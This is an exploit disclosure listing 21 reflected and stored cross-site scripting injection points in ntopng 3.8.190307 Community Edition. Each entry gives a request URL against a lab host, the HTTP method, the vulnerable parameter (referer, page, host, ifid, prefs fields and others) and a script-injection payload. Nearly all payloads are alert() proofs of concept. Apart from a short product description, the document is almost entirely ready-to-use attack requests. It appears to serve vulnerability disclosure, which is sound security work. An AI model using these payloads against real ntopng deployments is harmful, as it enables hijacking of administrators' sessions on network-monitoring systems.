##################################################################################################################################
# Exploit Title: ntopng 3.8.190307 - Community Edition | Cross Site
Scripting
# Date: 13.03.2019
# Exploit Author: Ozer Goker
# Vendor Homepage: https://www.ntop.org
# Software Link: http://packages.ntop.org
# Version: 3.8.190307
##################################################################################################################################

Introduction

ntopng is the next generation version of the original ntop, a network
traffic probe that monitors network usage. ntopng is based on libpcap and
it has been written in a portable way in order to virtually run on every
Unix platform, MacOSX and on Windows as well.

ntopng a yes, itas all lowercase a provides a intuitive, encrypted web user
interface for the exploration of realtime and historical traffic
information.

#################################################################################

XSS details: Reflected & Stored

#################################################################################


XSS1 | Reflected

URL
http://192.168.2.200:3000/lua/login.lua?referer=%27%3E%3Cscript%3Ealert(1)%3C/script%3E

METHOD
Get

PARAMETER
referer

PAYLOAD
'><script>alert(1)</script>


#################################################################################


XSS2 | Reflected

URL
http://192.168.2.200:3000/lua/about.lua

METHOD
Post

PARAMETER
ntopng_license

PAYLOAD
'><script>alert(2)</script>


#################################################################################


XSS3 | Stored

URL
http://192.168.2.200:3000/lua/runtime.lua

METHOD
Get


#################################################################################

XSS4 | Reflected

URL
http://192.168.2.200:3000/?page=TopFlowTalkers%27%3E%3Cscript%3Ealert(3)%3C/script%3E

METHOD
Get

PARAMETER
page

PAYLOAD
'><script>alert(3)</script>

#################################################################################


XSS5 | Reflected

URL
http://192.168.2.200:3000/lua/show_alerts.lua?status=historical%27%3E%3Cscript%3Ealert(4)%3C/script%3E

METHOD
Get

PARAMETER
status

PAYLOAD
'><script>alert(4)</script>

#################################################################################


XSS6 | Reflected

URL
http://192.168.2.200:3000/lua/flow_details.lua?flow_key=2169586644%3Cscript%3Ealert(5)%3C/script%3E

METHOD
Get

PARAMETER
flow_key

PAYLOAD
<script>alert(5)</script>


#################################################################################


XSS7 | Reflected

URL
http://192.168.2.200:3000/lua/host_details.lua?page=flows%27%3E%3Cscript%3Ealert(6)%3C/script%3E&host=ff02::1

METHOD
Get

PARAMETER
page

PAYLOAD
'><script>alert(6)</script>

#################################################################################


XSS8 | Reflected

URL
http://192.168.2.200:3000/lua/macs_stats.lua?devices_mode=source_macs_only%3Cscript%3Ealert(7)%3C/script%3E

METHOD
Get

PARAMETER
devices_mode

PAYLOAD
<script>alert(7)</script>

#################################################################################


XSS9 | Reflected

URL
http://192.168.2.200:3000/lua/hosts_stats.lua?pool=0%3Cscript%3Ealert(8)%3C/script%3E

METHOD
Get

PARAMETER
pool

PAYLOAD
<script>alert(8)</script>


#################################################################################


XSS10 | Reflected

URL
http://192.168.2.200:3000/lua/hosts_stats.lua?network=-1%3Cscript%3Ealert(9)%3C/script%3E

METHOD
Get

PARAMETER
network

PAYLOAD
<script>alert(9)</script>


#################################################################################


XSS11 | Reflected

URL
http://192.168.2.200:3000/lua/hosts_stats.lua?asn=0%3Cscript%3Ealert(10)%3C/script%3E

METHOD
Get

PARAMETER
asn

PAYLOAD
<script>alert(10)</script>

#################################################################################


XSS12 | Reflected

URL
http://192.168.2.200:3000/lua/hosts_stats.lua?country=AU%3Cscript%3Ealert(11)%3C/script%3E

METHOD
Get

PARAMETER
country

PAYLOAD
<script>alert(11)</script>

#################################################################################


XSS13 | Reflected

URL
http://192.168.2.200:3000/lua/host_details.lua?host=%3Cscript%3Ealert(12)%3C/script%3E

METHOD
Get

PARAMETER
host

PAYLOAD
<script>alert(12)</script>

#################################################################################


XSS14 | Reflected

URL
http://192.168.2.200:3000/lua/host_details.lua?host=1.1.1.1&page=config&ifid=2%3Cscript%3Ealert(13)%3C/script%3E

METHOD
Get

PARAMETER
ifid

PAYLOAD
<script>alert(13)</script>


#################################################################################


XSS15 | Reflected

URL
http://192.168.2.200:3000/lua/hosts_stats.lua?mode=remote%3Cscript%3Ealert(14)%3C/script%3E

METHOD
Get

PARAMETER
mode

PAYLOAD
<script>alert(14)</script>


#################################################################################


XSS16 | Reflected

URL
http://192.168.2.200:3000/lua/if_stats.lua?ifid=2%3Cscript%3Ealert(15)%3C/script%3E

METHOD
Get

PARAMETER
ifid

PAYLOAD
<script>alert(15)</script>


#################################################################################


XSS17 | Reflected

URL
http://192.168.2.200:3000/lua/if_stats.lua?ifid=2&page=packets%27%3E%3Cscript%3Ealert(16)%3C/script%3E

METHOD
Get

PARAMETER
page

PAYLOAD
'><script>alert(16)</script>


#################################################################################


XSS18 | Reflected

URL
http://192.168.2.200:3000/lua/admin/prefs.lua?tab=recording

METHOD
Post

PARAMETER
n2disk_license

PAYLOAD
<script>alert(17)</script>


#################################################################################


XSS19 | Reflected

URL
http://192.168.2.200:3000/lua/admin/prefs.lua?tab=%27%3E%3Cscript%3Ealert(18)%3C/script%3E

METHOD


PARAMETER
tab

PAYLOAD
'><script>alert(18)</script>


#################################################################################


XSS20 | Reflected

URL
http://192.168.2.200:3000/lua/admin/prefs.lua?tab=misc

METHOD
Post

PARAMETER
google_apis_browser_key

PAYLOAD
'><script>alert(19)</script>


#################################################################################


XSS21 | Reflected

URL
http://192.168.2.200:3000/lua/admin/prefs.lua?tab=misc

METHOD
Post

PARAMETER
http_acl_management_port

PAYLOAD
'><script>alert(20)</script>


#################################################################################
...
